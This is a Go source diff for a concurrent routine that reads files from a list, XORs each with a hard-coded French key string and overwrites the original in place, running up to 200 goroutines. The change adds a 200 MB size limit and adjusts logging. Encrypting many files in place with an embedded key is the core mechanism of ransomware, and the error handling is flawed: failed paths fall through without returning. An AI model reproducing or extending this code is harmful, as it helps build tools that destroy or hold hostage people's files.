@@ -5,7 +5,6 @@ import (
 	"io/ioutil"
 	"os"
 	"os/exec"
-	"runtime"
 	"strings"
 	"sync"
 )
@@ -17,13 +16,19 @@ var Xorstring = "salut_je_suis_la_phrase_qui_xor_cette_save_je_suis_tres_long_ce
 
 func Crypt(filename string, ch chan string) {
 	file, _ := os.Open(filename)
-	temp, _ := file.Stat()
-	if temp == nil {
+	fileInfo, err := os.Stat(filename)
+	if err != nil {
+		fmt.Println(err)
 		wgc.Done()
 		fmt.Println("fail " + filename)
 		Crypt(<-ch, ch)
 	}
-	arr := make([]byte, temp.Size())
+	if fileInfo.Size() > 200000000 {
+		wgc.Done()
+		fmt.Println("too big " + filename)
+		Crypt(<-ch, ch)
+	}
+	arr := make([]byte, fileInfo.Size())
 	_, _ = file.Read(arr)
 	file = nil
 	var xor []byte
@@ -34,7 +39,7 @@ func Crypt(filename string, ch chan string) {
 	_ = ioutil.WriteFile(filename, xor, 0644)
 	xor = nil
 	wgc.Done()
-	fmt.Println(filename)
+	fmt.Println("fini")
 	Crypt(<-ch, ch)
 }
 
@@ -52,6 +57,8 @@ func main() {
 		}(file)
 	}
 	wg.Wait()
+	<-ch
+	wgc.Done()
 	for i := 0; i < 200; i++ {
 		if len(ch) == 0 {
 			break
@@ -59,8 +66,4 @@ func main() {
 		go Crypt(<-ch, ch)
 	}
 	wgc.Wait()
-	fmt.Println("Ici")
-	fmt.Println(len(listfile))
-	fmt.Println(len(ch))
-	runtime.GC()
 }
